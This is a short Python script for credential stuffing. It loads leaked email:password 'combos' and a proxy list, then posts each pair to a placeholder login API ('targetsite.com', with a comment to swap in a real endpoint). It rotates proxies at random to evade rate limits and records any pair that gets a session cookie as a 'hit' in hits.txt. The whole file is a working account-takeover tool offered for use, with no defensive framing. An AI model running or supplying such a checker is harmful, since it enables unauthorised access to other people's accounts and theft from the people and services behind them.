import requests
import random

# Load combos and proxies
with open('combos.txt', 'r') as f:
    combos = [line.strip() for line in f if ':' in line]

with open('proxies.txt', 'r') as f:
    proxies = [line.strip() for line in f if ':' in line]

hits = []

# Capturer logic
for combo in combos:
    email, password = combo.split(':', 1)
    proxy = random.choice(proxies)
    proxy_dict = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }

    try:
        response = requests.post(
            "https://targetsite.com/api/login",  # Replace with your real endpoint
            json={"email": email, "password": password},
            proxies=proxy_dict,
            timeout=10
        )

        if "Set-Cookie" in response.headers:
            print(f"[HIT] {combo}")
            hits.append(combo)
        else:
            print(f"[FAIL] {combo}")

    except Exception as e:
        print(f"[ERROR] {combo} → {e}")

# Save hits
with open('hits.txt', 'w') as f:
    for hit in hits:
        f.write(hit + '\n')
